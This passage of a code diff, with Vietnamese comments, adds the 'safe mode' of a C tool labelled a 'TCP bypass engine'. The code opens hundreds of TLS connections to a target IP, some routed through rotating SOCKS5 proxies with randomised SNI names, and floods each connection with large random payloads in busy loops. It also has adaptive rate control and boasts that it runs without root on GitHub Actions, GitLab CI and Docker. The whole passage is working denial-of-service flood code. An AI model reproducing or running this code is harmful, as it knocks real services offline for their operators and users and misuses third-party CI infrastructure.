+     * Không cần root. Hoạt động trên GitHub Actions, GitLab CI, Docker.
+     * Kiến trúc: epoll edge-triggered + OpenSSL async + HTTP/2 frames
+     * ══════════════════════════════════════════════════════════════════════ */
+    signal(SIGINT,  _sig_stop_handler);
+    signal(SIGTERM, _sig_stop_handler);
+    LOG_INFO("T%d: SAFE MODE (TCP+TLS+HTTP/2) — no raw socket needed", tid);
+
+    /* Lấy interface bằng getifaddrs (không dùng /proc) */
+    char s_iface[32]="eth0";
+    { struct ifaddrs *ifas,*ifa;
+      if(getifaddrs(&ifas)==0){
+          for(ifa=ifas;ifa;ifa=ifa->ifa_next){
+              if(!ifa->ifa_addr||ifa->ifa_addr->sa_family!=AF_INET) continue;
+              if(strcmp(ifa->ifa_name,"lo")==0) continue;
+              if(ifa->ifa_flags&IFF_UP){strncpy(s_iface,ifa->ifa_name,31);break;}
+          }
+          freeifaddrs(ifas);
+      }
     }
+
+    /* --- Hằng số --- */
+    #define S_BATCH      512   /* Giảm connections để tránh tràn RAM 2GB */
+    #define S_EPOLL_SZ   1024
+    #define S_SEND_BURST 512
+    #define S_SEND_MIN   262144   /* 256KB per write — tăng throughput */
+    #define S_SEND_MAX   524288   /* 512KB per write */
+    #define S_TIMEOUT    5000  /* Timeout nhanh hơn để recycle nhanh */
+    #define S_RECYCLE_MIN 2147483648U   /* 2GB per conn trước khi recycle */
+    #define S_RECYCLE_MAX 4294967296U   /* 4GB */
+
+    /* Trạng thái connection */
+    #define S_ST_UNUSED      0
+    #define S_ST_CONNECTING  1
+    #define S_ST_PROXY_GREET 5  /* SOCKS5 greeting */
+    #define S_ST_PROXY_AUTH  6  /* SOCKS5 auth */
+    #define S_ST_PROXY_CONN  7  /* SOCKS5 CONNECT */
+    #define S_ST_TLS_HS      2  /* TLS handshake đang chạy */
+    #define S_ST_READY       3  /* Sẵn sàng gửi dữ liệu */
+    #define S_ST_SENDING     4
+
+    typedef struct {
+        int fd;
+        int state;
+        SSL *ssl;              /* OpenSSL session (NULL nếu không dùng TLS) */
+        unsigned long long bytes_sent;
+        unsigned long long max_bytes;
+        long long connect_time_ms;
+        int slot_idx;
+        int h2_stream_id;     /* HTTP/2 stream ID tiếp theo */
+        int h2_sent_preface;  /* Đã gửi H2 preface chưa */
+        Proxy *proxy;         /* SOCKS5 proxy (NULL = direct) */
+    } SafeConn;
+
+    /* --- Tạo SSL_CTX cho safe mode --- */
+    SSL_CTX *s_ssl_ctx = NULL;
+    int s_use_tls = (args.port == 443 || args.is_v18_tls);
+    if (s_use_tls) {
+        s_ssl_ctx = SSL_CTX_new(TLS_client_method());
+        SSL_CTX_set_verify(s_ssl_ctx, SSL_VERIFY_NONE, NULL);
+        SSL_CTX_set_min_proto_version(s_ssl_ctx, TLS1_2_VERSION);
+        SSL_CTX_set_cipher_list(s_ssl_ctx,
+            "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
+            "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
+            "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305");
+        /* ALPN: h2, http/1.1 */
+        unsigned char alpn[] = {2,'h','2', 8,'h','t','t','p','/','1','.','1'};
+#if OPENSSL_VERSION_NUMBER >= 0x10002000L
+        SSL_CTX_set_alpn_protos(s_ssl_ctx, alpn, sizeof(alpn));
+#endif
+#if OPENSSL_VERSION_NUMBER >= 0x10101000L
+        SSL_CTX_set_ciphersuites(s_ssl_ctx,
+            "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256");
+#endif
+        LOG_INFO("T%d: TLS enabled (port=%d)", tid, args.port);
+    }
+
+    /* --- Tạo epoll --- */
+    int s_epfd = epoll_create1(0);
+    struct epoll_event *s_evts = calloc(S_EPOLL_SZ, sizeof(struct epoll_event));
+    SafeConn *s_conns = calloc(S_BATCH, sizeof(SafeConn));
+    char *s_http_buf = malloc(65536);
+    if (!s_epfd || !s_evts || !s_conns || !s_http_buf) {
+        LOG_ERR("T%d: malloc failed", tid); return NULL;
+    }
+    for (int i=0; i<S_BATCH; i++) {
+        s_conns[i].fd=-1; s_conns[i].state=S_ST_UNUSED;
+        s_conns[i].slot_idx=i; s_conns[i].ssl=NULL;
+        s_conns[i].proxy=NULL;
+    }
+
+    struct sockaddr_in s_target = {0};
+    s_target.sin_family = AF_INET;
+    s_target.sin_port = htons(args.port);
+    inet_pton(AF_INET, args.target_ip, &s_target.sin_addr);
+
+    /* HTTP paths cho request */
+    static const char *s_paths[]={"/","/index.html","/api/v1/status","/api/health",
+        "/favicon.ico","/robots.txt","/wp-admin/","/xmlrpc.php","/api/graphql",
+        "/search?q=test","/login","/static/js/main.js","/assets/style.css",
+        "/.well-known/security.txt","/sitemap.xml"};
+    int s_npaths = 15;
+
+    /* --- Macro tạo connection --- */
+    #define S_CREATE(idx) do { \
+        SafeConn *_c = &s_conns[idx]; \
+        int _fd = socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK, 0); \
+        if(_fd<0) break; \
+        int _1=1; \
+        setsockopt(_fd,IPPROTO_TCP,TCP_NODELAY,&_1,sizeof(_1)); \
+        (void)setsockopt(_fd,IPPROTO_TCP,TCP_QUICKACK,&_1,sizeof(_1)); \
+        int _sb=16*1024*1024; \
+        setsockopt(_fd,SOL_SOCKET,SO_SNDBUF,&_sb,sizeof(_sb)); \
+        setsockopt(_fd,SOL_SOCKET,SO_RCVBUF,&_sb,sizeof(_sb)); \
+        setsockopt(_fd,SOL_SOCKET,SO_REUSEADDR,&_1,sizeof(_1)); \
+        /* SOCKS5: nếu có proxy, connect đến proxy thay vì target */ \
+        _c->proxy = NULL; \
+        struct sockaddr_in _dst; \
+        memset(&_dst, 0, sizeof(_dst)); \
+        _dst.sin_family = AF_INET; \
+        if (proxy_count > 0) { \
+            Proxy *_p = select_alive_proxy(); \
+            if (_p) { \
+                _c->proxy = _p; \
+                char _pip[64]; \
+                resolve_host(_p->host, _pip); \
+                if (inet_pton(AF_INET, _pip, &_dst.sin_addr) != 1) { \
+                } \
+                _dst.sin_port = htons(_p->port); \
+                __sync_fetch_and_add(&_p->active_conns, 1); \
+            } else { \
+                memcpy(&_dst, &s_target, sizeof(_dst)); \
+            } \
+        } else { \
+            memcpy(&_dst, &s_target, sizeof(_dst)); \
+        } \
+        int _r=connect(_fd,(struct sockaddr*)&_dst,sizeof(_dst)); \
+        if(_r<0 && errno!=EINPROGRESS){close(_fd); \
+            if(_c->proxy){__sync_fetch_and_sub(&_c->proxy->active_conns,1);_c->proxy=NULL;} \
+            break;} \
+        struct epoll_event _ev; \
+        _ev.events=EPOLLET|EPOLLOUT|EPOLLIN|EPOLLHUP|EPOLLERR; \
+        _ev.data.ptr=_c; \
+        if(epoll_ctl(s_epfd,EPOLL_CTL_ADD,_fd,&_ev)<0){close(_fd); \
+            if(_c->proxy){__sync_fetch_and_sub(&_c->proxy->active_conns,1);_c->proxy=NULL;} \
+            break;} \
+        _c->fd=_fd; _c->state=S_ST_CONNECTING; _c->bytes_sent=0; \
+        _c->max_bytes=S_RECYCLE_MIN+(fast_rand()%(S_RECYCLE_MAX-S_RECYCLE_MIN)); \
+        _c->connect_time_ms=get_ms(); _c->ssl=NULL; \
+        _c->h2_stream_id=1; _c->h2_sent_preface=0; \
+    } while(0)
+
+    /* Macro đóng + tái tạo connection */
+    #define S_RECYCLE(idx) do { \
+        SafeConn *_c=&s_conns[idx]; \
+        if(_c->ssl){SSL_shutdown(_c->ssl);SSL_free(_c->ssl);_c->ssl=NULL;} \
+        if(_c->fd>=0){epoll_ctl(s_epfd,EPOLL_CTL_DEL,_c->fd,NULL);close(_c->fd);} \
+        if(_c->proxy){ \
+            if(_c->proxy->active_conns>0) __sync_fetch_and_sub(&_c->proxy->active_conns,1); \
+            _c->proxy=NULL; \
+        } \
+        _c->fd=-1; _c->state=S_ST_UNUSED; _c->bytes_sent=0; \
+        _c->h2_stream_id=1; _c->h2_sent_preface=0; \
+        S_CREATE(idx); \
+    } while(0)
+
+    /* --- Khởi tạo connections --- */
+    int s_nconns = S_BATCH; /* Luôn dùng tối đa connections */
+    LOG_INFO("T%d: Khởi tạo %d connections tới %s:%d (TLS=%d)",
+             tid, s_nconns, args.target_ip, args.port, s_use_tls);
+    for (int i=0; i<s_nconns; i++) {
+        S_CREATE(i);
+        if (i>0 && i%200==0) {
+            int nf=epoll_wait(s_epfd,s_evts,S_EPOLL_SZ,0);
+            for(int j=0;j<nf;j++){
+                SafeConn *c=(SafeConn*)s_evts[j].data.ptr;
+                if(c && (s_evts[j].events&(EPOLLERR|EPOLLHUP))) S_RECYCLE(c->slot_idx);
+            }
+        }
+    }
+
+    /* --- Adaptive rate control --- */
+    long long s_rate_check = get_ms();
+    unsigned long long s_ok_snap=0, s_fail_snap=0;
+
+    /* --- VÒNG LẶP CHÍNH SAFE MODE --- */
+    long long s_last_timeout = get_ms();
+    long long s_last_log = get_ms();
+
+    while (!g_stop) {
+        /* timeout=0: busy-poll, không sleep 1ms — tăng throughput */
+        int nfds = epoll_wait(s_epfd, s_evts, S_EPOLL_SZ, 0);
+        long long now = get_ms(); /* Cache timestamp */
+
+        for (int i=0; i<nfds; i++) {
+            SafeConn *c = (SafeConn*)s_evts[i].data.ptr;
+            if (!c || c->fd<0) continue;
+            unsigned int ev = s_evts[i].events;
+
+            /* Lỗi → tái tạo */
+            if (ev & (EPOLLERR|EPOLLHUP)) {
+                thread_stats[tid].connect_fail++;
+                S_RECYCLE(c->slot_idx);
+                continue;
+            }
+
+            /* EPOLLIN: xử lý proxy response và drain recv buffer */
+            if (ev & EPOLLIN) {
+                if (c->state == S_ST_PROXY_GREET) {
+                    unsigned char resp[2];
+                    int r = read(c->fd, resp, 2);
+                    if (r == 2 && resp[0] == 0x05) {
+                        LOG_INFO("T%d SOCKS5 greet resp: ver=%02x method=%02x", tid, resp[0], resp[1]);
+                        if (resp[1] == 0x00) {
+                            unsigned char conn_req[10];
+                            conn_req[0] = 0x05; conn_req[1] = 0x01; conn_req[2] = 0x00; conn_req[3] = 0x01; 
+                            struct in_addr taddr; char ip_buf[64];
+                            resolve_host(args.target_ip, ip_buf); inet_pton(AF_INET, ip_buf, &taddr);
+                            memcpy(conn_req+4, &taddr, 4);
+                            uint16_t tport = htons(args.port); memcpy(conn_req+8, &tport, 2);
+                            send(c->fd, conn_req, 10, MSG_NOSIGNAL);
+                            c->state = S_ST_PROXY_CONN;
+                        } else if (resp[1] == 0x02 && strlen(c->proxy->user) > 0) {
+                            unsigned char auth[515]; int ap=0;
+                            auth[ap++] = 0x01; 
+                            int ulen = strlen(c->proxy->user); if(ulen>255)ulen=255;
+                            auth[ap++] = ulen; memcpy(auth+ap, c->proxy->user, ulen); ap+=ulen;
+                            int plen = strlen(c->proxy->pass); if(plen>255)plen=255;
+                            auth[ap++] = plen; memcpy(auth+ap, c->proxy->pass, plen); ap+=plen;
+                            send(c->fd, auth, ap, MSG_NOSIGNAL);
+                            c->state = S_ST_PROXY_AUTH;
+                        } else {
+                            LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, "Unsupported method");
+                            S_RECYCLE(c->slot_idx); continue;
+                        }
+                    } else if (r <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
+                        LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, strerror(errno));
+                        S_RECYCLE(c->slot_idx); continue;
+                    }
+                } else if (c->state == S_ST_PROXY_AUTH) {
+                    unsigned char resp[2];
+                    int r = read(c->fd, resp, 2);
+                    if (r == 2) {
+                        LOG_INFO("T%d SOCKS5 auth resp: ver=%02x status=%02x", tid, resp[0], resp[1]);
+                        if (resp[1] == 0x00) {
+                            unsigned char conn_req[10];
+                            conn_req[0] = 0x05; conn_req[1] = 0x01; conn_req[2] = 0x00; conn_req[3] = 0x01; 
+                            struct in_addr taddr; char ip_buf[64];
+                            resolve_host(args.target_ip, ip_buf); inet_pton(AF_INET, ip_buf, &taddr);
+                            memcpy(conn_req+4, &taddr, 4);
+                            uint16_t tport = htons(args.port); memcpy(conn_req+8, &tport, 2);
+                            send(c->fd, conn_req, 10, MSG_NOSIGNAL);
+                            c->state = S_ST_PROXY_CONN;
+                        } else {
+                            LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, "Auth failed");
+                            S_RECYCLE(c->slot_idx); continue;
+                        }
+                    } else if (r <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
+                        LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, strerror(errno));
+                        S_RECYCLE(c->slot_idx); continue;
+                    }
+                } else if (c->state == S_ST_PROXY_CONN) {
+                    unsigned char resp[10];
+                    int r = read(c->fd, resp, 10);
+                    if (r >= 2 && resp[0] == 0x05) {
+                        LOG_INFO("T%d SOCKS5 conn resp: ver=%02x rep=%02x", tid, resp[0], resp[1]);
+                        if (resp[1] == 0x00) {
+                            thread_stats[tid].connect_success++;
+                            if(c->proxy->fail_count > 0) c->proxy->fail_count = 0;
+                            c->proxy->success_count++;
+                            if (s_use_tls) {
+                                c->ssl = SSL_new(s_ssl_ctx);
+                                SSL_set_fd(c->ssl, c->fd);
+                                SSL_set_tlsext_host_name(c->ssl, v17_sni_domains[fast_rand()%n_sni]);
+                                SSL_set_connect_state(c->ssl);
+                                c->state = S_ST_TLS_HS;
+                            } else {
+                                c->state = S_ST_READY;
+                            }
+                        } else {
+                            LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, "Connect rejected");
+                            S_RECYCLE(c->slot_idx); continue;
+                        }
+                    } else if (r <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
+                        LOG_INFO("T%d SOCKS5 error at state %d: %s", tid, c->state, strerror(errno));
+                        S_RECYCLE(c->slot_idx); continue;
+                    }
+                } else if (c->ssl) {
+                    char d[8192]; int r;
+                    while((r=SSL_read(c->ssl,d,sizeof(d)))>0){}
+                    if(r<=0){
+                        int e=SSL_get_error(c->ssl,r);
+                        if(e!=SSL_ERROR_WANT_READ && e!=SSL_ERROR_WANT_WRITE){
+                            S_RECYCLE(c->slot_idx); continue;
+                        }
+                    }
+                } else if (c->state >= S_ST_READY) {
+                    char d[8192];
+                    while(recv(c->fd,d,sizeof(d),MSG_DONTWAIT)>0){}
+                }
+            }
+
+            /* State Machine (Write-driven) */
+            if (ev & EPOLLOUT) {
+                /* Trạng thái 1: TCP connect vừa hoàn tất */
+                if (c->state == S_ST_CONNECTING) {
+                    int so_err=0; socklen_t so_len=sizeof(so_err);
+                    getsockopt(c->fd,SOL_SOCKET,SO_ERROR,&so_err,&so_len);
+                    if (so_err!=0) {
+                        LOG_ERR("T%d connect error: %s (proxy=%s)", tid, strerror(so_err), c->proxy ? "yes" : "no");
+                        thread_stats[tid].connect_fail++;
+                        if(c->proxy){__sync_fetch_and_add(&c->proxy->fail_count,1);c->proxy->last_fail_time=get_ms();if(c->proxy->fail_count>=15)c->proxy->is_dead=1;}
+                        S_RECYCLE(c->slot_idx); continue;
+                    }
+                    { int qa=1; (void)setsockopt(c->fd,IPPROTO_TCP,TCP_QUICKACK,&qa,sizeof(qa)); }
+
+                    if (c->proxy) {
+                        LOG_INFO("T%d connected to proxy %s:%d", tid, c->proxy->host, c->proxy->port);
+                        struct timeval tv;
+                        tv.tv_sec = 5;
+                        tv.tv_usec = 0;
+                        setsockopt(c->fd, SOL_SOCKET, SO_RCVTIMEO, (const void*)&tv, sizeof(tv));
+                        setsockopt(c->fd, SOL_SOCKET, SO_SNDTIMEO, (const void*)&tv, sizeof(tv));
+                        
+                        unsigned char greet[4] = {0x05, 0x02, 0x00, 0x02};
+                        send(c->fd, greet, 4, MSG_NOSIGNAL);
+                        c->state = S_ST_PROXY_GREET;
+                    } else {
+                        LOG_INFO("T%d direct connect, no proxy", tid);
+                        thread_stats[tid].connect_success++;
+                        if (s_use_tls) {
+                            c->ssl = SSL_new(s_ssl_ctx);
+                            SSL_set_fd(c->ssl, c->fd);
+                            SSL_set_tlsext_host_name(c->ssl, v17_sni_domains[fast_rand()%n_sni]);
+                            SSL_set_connect_state(c->ssl);
+                            c->state = S_ST_TLS_HS;
+                        } else {
+                            c->state = S_ST_READY;
+                        }
+                    }
+                }
+
+                /* Trạng thái: TLS handshake bất đồng bộ */
+                if (c->state == S_ST_TLS_HS && c->ssl) {
+                    int r = SSL_connect(c->ssl);
+                    if (r == 1) {
+                        c->state = S_ST_READY;
+                    } else {
+                        int e = SSL_get_error(c->ssl, r);
+                        if (e==SSL_ERROR_WANT_READ || e==SSL_ERROR_WANT_WRITE) {
+                            continue;
+                        }
+                        thread_stats[tid].connect_fail++;
+                        if(c->proxy){__sync_fetch_and_add(&c->proxy->fail_count,1);c->proxy->last_fail_time=get_ms();}
+                        S_RECYCLE(c->slot_idx); continue;
+                    }
+                }
+
+                /* Trạng thái 3: Sẵn sàng → gửi HTTP/2 preface hoặc HTTP/1.1 */
+                if (c->state == S_ST_READY) {
+                    if (!c->h2_sent_preface) {
+                        /* Gửi HTTP/2 connection preface */
+                        int r;
+                        if (c->ssl)
+                            r = SSL_write(c->ssl, v17_h2_preface, sizeof(v17_h2_preface));
+                        else
+                            r = send(c->fd, v17_h2_preface, sizeof(v17_h2_preface), MSG_NOSIGNAL);
+                        if (r>0) {
+                            thread_stats[tid].bytes+=r;
+                            thread_stats[tid].packets++;
+                        }
+                        c->h2_sent_preface = 1;
+
+                        /* Gửi HTTP/2 HEADERS frame (GET /) */
+                        unsigned char h2h[64];
+                        int hp=0;
+                        /* HEADERS frame: length=6, type=1, flags=0x05, stream=1 */
+                        h2h[hp++]=0;h2h[hp++]=0;h2h[hp++]=6; /* length */
+                        h2h[hp++]=0x01; /* type=HEADERS */
+                        h2h[hp++]=0x05; /* END_STREAM|END_HEADERS */
+                        h2h[hp++]=0;h2h[hp++]=0;h2h[hp++]=0;h2h[hp++]=0x01; /* stream=1 */
+                        /* HPACK: :method=GET, :scheme=https, :path=/ */
+                        h2h[hp++]=0x82; h2h[hp++]=0x87; h2h[hp++]=0x84;
+                        h2h[hp++]=0x41; /* :authority */
+                        int hl=strlen(args.host);
+                        h2h[hp++]=hl&0x7F;
+                        memcpy(h2h+hp,args.host,hl>40?40:hl);hp+=(hl>40?40:hl);
+                        /* Cập nhật length */
+                        int fl=hp-9; h2h[0]=(fl>>16)&0xFF;h2h[1]=(fl>>8)&0xFF;h2h[2]=fl&0xFF;
+
+                        if(c->ssl) r=SSL_write(c->ssl,h2h,hp);
+                        else r=send(c->fd,h2h,hp,MSG_NOSIGNAL);
+                        if(r>0){thread_stats[tid].bytes+=r;thread_stats[tid].packets++;}
+                        c->h2_stream_id = 3;
+                    }
+                    c->state = S_ST_SENDING;
+                }
+
+                /* Trạng thái 4: BLAST dữ liệu */
+                if (c->state == S_ST_SENDING) {
+                    int ok=1;
+
+                    for (int b=0; b<S_SEND_BURST && ok; b++) {
+                        int size = S_SEND_MIN+(fast_rand()%(S_SEND_MAX-S_SEND_MIN));
+                        int off = fast_rand()%(BUFFER_POOL_SIZE-size);
+                        int r;
+                        if (c->ssl)
+                            r = SSL_write(c->ssl, global_buffer_pool+off, size);
+                        else
+                            r = send(c->fd, global_buffer_pool+off, size, MSG_NOSIGNAL);
+
+                        if (r<=0) {
+                            if (c->ssl) {
+                                int e=SSL_get_error(c->ssl,r);
+                                if(e==SSL_ERROR_WANT_WRITE||e==SSL_ERROR_WANT_READ) break;
+                            } else {
+                                if(errno==EAGAIN||errno==EWOULDBLOCK) break;
+                            }
+                            ok=0; break;
+                        }
+                        thread_stats[tid].packets++;
+                        thread_stats[tid].tcp_packets++;
+                        thread_stats[tid].bytes+=r;
+                        c->bytes_sent+=r;
+                    }
+
+                    if (!ok) { thread_stats[tid].send_errors++; S_RECYCLE(c->slot_idx); continue; }
+                    if (c->bytes_sent >= c->max_bytes) S_RECYCLE(c->slot_idx);
+                }
+            }
+        }
+
+        if (now - s_last_timeout >= 2000) {
+            for (int i=0; i<s_nconns; i++) {
+                SafeConn *c = &s_conns[i];
+                if ((c->state>=S_ST_CONNECTING && c->state<=S_ST_PROXY_CONN) && c->fd>=0) {
+                    if (now-c->connect_time_ms > S_TIMEOUT) {
+                        thread_stats[tid].connect_fail++;
+                        S_RECYCLE(i);
+                    }
+                }
+            }
+            s_last_timeout = now;
+        }
+
+        /* ── Adaptive rate control (mỗi 10 giây, ít aggressive hơn) ── */
+        if (tid==0 && now-s_rate_check>=10000) {
+            unsigned long long ok_now = thread_stats[0].connect_success;
+            unsigned long long fail_now = thread_stats[0].connect_fail;
+            unsigned long long d_ok = ok_now - s_ok_snap;
+            unsigned long long d_fail = fail_now - s_fail_snap;
+            s_ok_snap=ok_now; s_fail_snap=fail_now;
+            if (d_ok+d_fail > 0) {
+                double fail_pct = (double)d_fail / (double)(d_ok+d_fail+1) * 100.0;
+                if (fail_pct > 50.0) {
+                    int nr = (int)(atomic_load(&v17_current_rate) * 0.85);
+                    if (nr < 500) nr = 500;
+                    atomic_store(&v17_current_rate, nr);
+                    LOG_INFO("T0: Rate DOWN %.1f%% fail → rate=%d", fail_pct, nr);
+                } else if (fail_pct < 5.0 && atomic_load(&v17_current_rate) < args.rate) {
+                    int nr = (int)(atomic_load(&v17_current_rate) * 1.3);
+                    if (nr > args.rate) nr = args.rate;
+                    atomic_store(&v17_current_rate, nr);
+                }
+            }
+            s_rate_check = now;
+        }
+
+        /* ── Duy trì connection pool ── */
+        for (int i=0; i<s_nconns; i++) {
+            if (s_conns[i].state==S_ST_UNUSED && s_conns[i].fd<0)
+                S_CREATE(i);
+        }
+
+        /* ── Active sweep: busy-send trên TẤT CẢ connections SENDING ── */
+        for (int i=0; i<s_nconns; i++) {
+            SafeConn *c = &s_conns[i];
+            if (c->state != S_ST_SENDING || c->fd < 0) continue;
+            /* TCP_CORK: batch nhiều send thành 1 segment lớn */
+            int _ck=1; setsockopt(c->fd, IPPROTO_TCP, TCP_CORK, &_ck, sizeof(_ck));
+            for (int b=0; b<S_SEND_BURST; b++) {
+                int size = S_SEND_MIN+(fast_rand()%(S_SEND_MAX-S_SEND_MIN));
+                int off = fast_rand()%(BUFFER_POOL_SIZE-size);
+                int r;
+                if (c->ssl)
+                    r = SSL_write(c->ssl, global_buffer_pool+off, size);
+                else
+                    r = send(c->fd, global_buffer_pool+off, size, MSG_NOSIGNAL|MSG_MORE);
+                if (r<=0) break;
+                thread_stats[tid].packets++;
+                thread_stats[tid].tcp_packets++;
+                thread_stats[tid].bytes+=r;
+                c->bytes_sent+=r;
+            }
+            _ck=0; setsockopt(c->fd, IPPROTO_TCP, TCP_CORK, &_ck, sizeof(_ck));
+            if (c->bytes_sent >= c->max_bytes) S_RECYCLE(c->slot_idx);
+        }
+
+        /* ── Log mỗi 10 giây ── */
+        if (tid==0 && now-s_last_log>=10000) {
+            int act=0,hs=0,snd=0,prx=0;
+            for(int i=0;i<s_nconns;i++){
+                if(s_conns[i].state==S_ST_TLS_HS) hs++;
+                else if(s_conns[i].state==S_ST_SENDING) snd++;
+                else if(s_conns[i].state==S_ST_PROXY_GREET||s_conns[i].state==S_ST_PROXY_AUTH||s_conns[i].state==S_ST_PROXY_CONN) prx++;
+                if(s_conns[i].fd>=0) act++;
+            }
+            LOG_INFO("T%d SAFE | act=%d tls=%d send=%d proxy=%d | pkts=%llu B=%llu ok=%llu fail=%llu rate=%d",
+                     tid,act,hs,snd,prx,
+                     thread_stats[tid].packets,thread_stats[tid].bytes,
+                     thread_stats[tid].connect_success,thread_stats[tid].connect_fail,
+                     v17_current_rate);
+            s_last_log=now;
+        }
+    }
+
+    /* Cleanup safe mode */
+    for(int i=0;i<S_BATCH;i++){
+        if(s_conns[i].ssl){SSL_shutdown(s_conns[i].ssl);SSL_free(s_conns[i].ssl);}
+        if(s_conns[i].proxy && s_conns[i].proxy->active_conns>0)
+            __sync_fetch_and_sub(&s_conns[i].proxy->active_conns,1);
+        if(s_conns[i].fd>=0) close(s_conns[i].fd);
+    }
+    free(s_evts);free(s_conns);free(s_http_buf);
+    close(s_epfd);
+    if(s_ssl_ctx) SSL_CTX_free(s_ssl_ctx);
+    return NULL;
+    } /* ── KẾT THÚC V17 TCP BYPASS ENGINE V2 ── */
 
 
 
